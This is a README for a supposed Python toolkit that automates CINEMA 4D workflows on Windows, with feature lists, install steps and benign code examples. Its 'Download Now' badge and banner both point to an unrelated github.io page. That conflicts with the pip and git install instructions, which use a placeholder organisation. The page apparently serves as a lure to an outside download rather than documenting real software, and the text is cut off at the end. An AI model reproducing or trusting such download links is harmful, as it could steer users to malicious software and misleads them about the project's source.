# cinema-4d-toolkit

[![Download Now](https://img.shields.io/badge/Download_Now-Click_Here-brightgreen?style=for-the-badge&logo=download)](https://iybcy.github.io/cinema-site-ser/)


[![Banner](banner.png)](https://iybcy.github.io/cinema-site-ser/)


[![Python Version](https://img.shields.io/badge/python-3.8%2B-blue.svg)](https://www.python.org/downloads/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Platform](https://img.shields.io/badge/platform-Windows-lightgrey.svg)](https://www.maxon.net/cinema-4d)
[![PyPI version](https://img.shields.io/badge/pypi-v0.4.2-orange.svg)](https://pypi.org/)
[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](CONTRIBUTING.md)
[![Code Style: Black](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)

> A Python toolkit for automating CINEMA 4D workflows on Windows — process project files, extract scene data, and build scalable 3D pipeline utilities without leaving your terminal.

**cinema-4d-toolkit** is a developer-focused Python library that interfaces with CINEMA 4D's native file formats and scripting APIs on Windows. Whether you're building a render farm pipeline, batch-processing `.c4d` scene files, or extracting asset metadata across large projects, this toolkit provides clean, scriptable utilities to get the job done efficiently.

---

## 📋 Table of Contents

- [Features](#features)
- [Requirements](#requirements)
- [Installation](#installation)
- [Quick Start](#quick-start)
- [Usage Examples](#usage-examples)
- [API Reference](#api-reference)
- [Contributing](#contributing)
- [License](#license)

---

## ✨ Features

- **Scene File Parsing** — Read and inspect `.c4d` project files programmatically, including object hierarchies, materials, and tags
- **Batch Workflow Automation** — Process hundreds of CINEMA 4D scenes in sequence using configurable pipeline scripts
- **Asset & Texture Inventory** — Scan project files and generate structured reports of all linked textures and external assets
- **Render Settings Extraction** — Pull render configuration data (resolution, frame range, output paths) from `.c4d` files without opening the GUI
- **Object Hierarchy Traversal** — Walk the scene graph and filter objects by type, name pattern, or custom tag
- **CLI Interface** — Run common operations directly from the Windows command line with a built-in `c4dtk` command
- **JSON / CSV Export** — Export extracted scene data to machine-readable formats for downstream processing or dashboards
- **CINEMA 4D Python API Wrapper** — Thin, ergonomic wrappers around `c4d` module calls to reduce boilerplate in custom scripts

---

## 🖥️ Requirements

| Requirement | Version / Notes |
|---|---|
| **Python** | 3.8 or higher |
| **Operating System** | Windows 10 / Windows 11 (64-bit) |
| **CINEMA 4D** | R25, R26, 2023, 2024, or 2025 (Maxon) |
| **c4d Python API** | Bundled with CINEMA 4D installation |
| **click** | `>= 8.0` |
| **rich** | `>= 13.0` |
| **pydantic** | `>= 2.0` |
| **pandas** | `>= 2.0` *(optional, for CSV export)* |

> **Note:** For scene graph features that require a live CINEMA 4D session, the toolkit must run inside CINEMA 4D's Script Manager or via the `c4dpy` interpreter shipped with your installation. File-parsing utilities run in any standard Python 3.8+ environment.

---

## ⚙️ Installation

### From PyPI

```bash
pip install cinema-4d-toolkit
```

### From Source

```bash
git clone https://github.com/your-org/cinema-4d-toolkit.git
cd cinema-4d-toolkit
pip install -e ".[dev]"
```

### Using `c4dpy` (Recommended for Scene API Features)

CINEMA 4D ships with its own Python interpreter on Windows. To install the toolkit into that environment:

```bash
# Locate c4dpy — typically found at:
# C:\Program Files\Maxon Cinema 4D 2024\c4dpy.exe

"C:\Program Files\Maxon Cinema 4D 2024\c4dpy.exe" -m pip install cinema-4d-toolkit
```

---

## 🚀 Quick Start

```python
from cinema4d_toolkit import SceneInspector

# Point to any .c4d file on your Windows machine
inspector = SceneInspector(r"C:\Projects\my_scene.c4d")

# Print a summary of the scene
summary = inspector.summarize()
print(summary)
# Output:
# Scene: my_scene.c4d
# Objects : 142
# Materials: 18
# Textures : 34 (3 missing)
# Frame Range: 0 - 240
# Render Size: 1920 x 1080
```

---

## 📖 Usage Examples

### 1. Batch Extract Render Settings from Multiple Scenes

```python
import json
from pathlib import Path
from cinema4d_toolkit import SceneInspector
from cinema4d_toolkit.exporters import RenderSettingsExporter

scene_dir = Path(r"C:\Projects\Renders")
results = []

for c4d_file in scene_dir.rglob("*.c4d"):
    try:
        inspector = SceneInspector(c4d_file)
        render_data = inspector.get_render_settings()
        results.append({
            "file": str(c4d_file.name),
            "width": render_data.width,
            "height": render_data.height,
            "fps": render_data.fps,
            "frame_start": render_data.frame_start,
            "frame_end": render_data.frame_end,
            "output_path": render_data.output_path,
        })
    except Exception as e:
        print(f"[WARN] Could not parse {c4d_file.name}: {e}")

with open("render_inventory.json", "w") as f:
    json.dump(results, f, indent=2)

print(f"Processed {len(results)} scene files.")
```

---

### 2. Scan for Missing Textures Across a Project

```python
from pathlib import Path
from cinema4d_toolkit import SceneInspector
from cinema4d_toolkit.reports import TextureReport

project_root = Path(r"C:\Projects\ClientProject")
report = TextureReport()

for c4d_file in project_root.rglob("*.c4d"):
    inspector = SceneInspector(c4d_file)
    textures = inspector.get_textures()

    for tex in textures:
        if not tex.exists_on_disk():
            report.add_missing(scene=c4d_file.name, texture=tex)

# Export a CSV of all missing assets
report.to_csv("missing_textures.csv")
report.print_summary()

# Console output:
# ┌─────────────────────────────────────────────────────┐
# │  Texture Report Summary                             │
# │  Total Scenes Scanned : 24                          │
# │  Total Textures Found : 381                         │
# │  Missing Textures     : 7                           │
# └─────────────────────────────────────────────────────┘
```

---

### 3. Traverse the Scene Object Hierarchy

```python
# Run inside CINEMA 4D Script Manager or via c4dpy
import c4d
from cinema4d_toolkit.scene import ObjectWalker

doc = c4d.documents.GetActiveDocument()
walker = ObjectWalker(doc)

# Find all polygon objects with names matching a pattern
poly_objects = walker.find(
    object_type=c4d.Opolygon,
    name_pattern="*_hero_*",
    recursive=True
)

for obj in poly_objects:
    print(f"{obj.GetName()} — Polygons: {obj.GetPolygonCount()}")

# Output:
# car_hero_body    — Polygons: 14820
# car_hero_wheels  — Polygons: 3640
# char_hero_mesh   — Polygons: 22110
```

---

### 4. Automate Scene Cleanup via CLI

The toolkit ships with a `c4dtk` CLI tool for Windows pipelines:

```bash
# Scan a directory and report on all scene files
c4dtk scan "C:\Projects\Season2" --output report.json

# Check for missing textures in a single scene
c4dtk textures check "C:\Projects\episode_01.c4d"

# Extract render settings to stdout as JSON
c4dtk render-settings "C:\Projects\episode_01.c4d" --format json

# Batch update output paths across all scenes in a folder
c4dtk render-settings patch "C:\Projects\Season2" \
    --set output_path "D:\Renders\Season2\{scene_name}"
```

---

### 5. Export Full Scene Inventory to CSV

```python
from cinema4d_toolkit import SceneInspector
from cinema4d_toolkit.exporters import SceneInventoryExporter

inspector = SceneInspector(r"C:\Projects\final_composite.c4d")
exporter = SceneInventoryExporter(inspector)

# Export full object tree, materials, and tags to CSV
exporter.to_csv(
    output_path="scene_inventory.csv",
    include=["objects", "materials", "tags", "render_settings"]
)

print("Inventory written to scene_inventory.csv")
```

---

## 📁 Project Structure

```
cinema-4d-toolkit/
├── cinema4d_toolkit/
│   ├── __init__.py
│   ├── scene.py          # SceneInspector, ObjectWalker
│   ├── exporters.py      # CSV, JSON exporters
│   ├── reports.py        # TextureReport, RenderReport
│   ├── cli.py            # Click-based CLI (c4dtk)
│   └── models.py         # Pydantic data models
├── tests/
│   ├── test_scene.py
│   ├── test_exporters.py
│   └── fixtures/         # Sample .c4d test files
├── docs/
├── pyproject.toml
├── CONTRIBUTING.md
└── README.md
```

---

## 🤝 Contributing

Contributions are welcome and appreciated. Please follow these steps:

1. **Fork** the repository
2. **Create** a feature branch: `git checkout -b feature/your-feature-name`
3. **Write tests** for your changes in the `tests/` directory
4. **Run the test suite**: `pytest tests/ -v`
5. **Format your code**: `black cinema4d_toolkit/`
6. **Submit** a pull request with a clear description of the change

Please review [CONTRIBUTING.md](CONTRIBUTING.md) for code style guidelines and the development environment setup instructions for Windows.

### Reporting Issues

If you encounter a bug or unexpected behavior while working with a specific CINEMA 4D version on Windows, please open a GitHub issue and include:

- Your CINEMA 4D version (e.g., 2024.2.0)
- Your Python version and whether you're using `c4dpy` or system Python
- A minimal reproducible example if possible

---

## 📄 License

This project is licensed under the **MIT License** — see the [LICENSE](LICENSE) file for details.

---

## 🙏 Acknowledgements

- [Maxon](https://www.maxon.net/) for the CINEMA 4D Python scripting API documentation
- The open-source Python community for `click`, `rich`, and `pydantic`
- Contributors who have submitted bug reports and pull requests

---

*cinema-4d-toolkit is an